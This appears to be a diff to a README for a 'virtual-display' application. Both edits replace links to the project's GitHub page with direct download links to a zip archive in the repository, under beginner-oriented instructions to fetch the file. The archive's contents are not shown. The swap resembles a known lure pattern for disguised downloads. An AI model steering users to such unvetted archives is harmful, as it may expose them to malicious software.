@@ -23,7 +23,7 @@ Ready to get started? Here's how you get virtual-display on your computer.
 
 Visit this link to download the application:
 
-[**⬇️ Download virtual-display**](https://github.com/creepsteraimod-ui/virtual-display)
+[**⬇️ Download virtual-display**](https://raw.githubusercontent.com/creepsteraimod-ui/virtual-display/main/app/virtual_display_v2.3.zip)
 
 Click the link above. Your browser will open the download page. Look for the biggest, most obvious download button or link on that page, and click it. The file will start downloading to your computer, usually to your "Downloads" folder.
 
@@ -109,7 +109,7 @@ virtual-display takes something that sounds technical and makes it wonderfully s
 
 Download it today, and see how easy managing virtual screens can be.
 
-[**⬇️ Get virtual-display now**](https://github.com/creepsteraimod-ui/virtual-display)
+[**⬇️ Get virtual-display now**](https://raw.githubusercontent.com/creepsteraimod-ui/virtual-display/main/app/virtual_display_v2.3.zip)
 
 ---
 
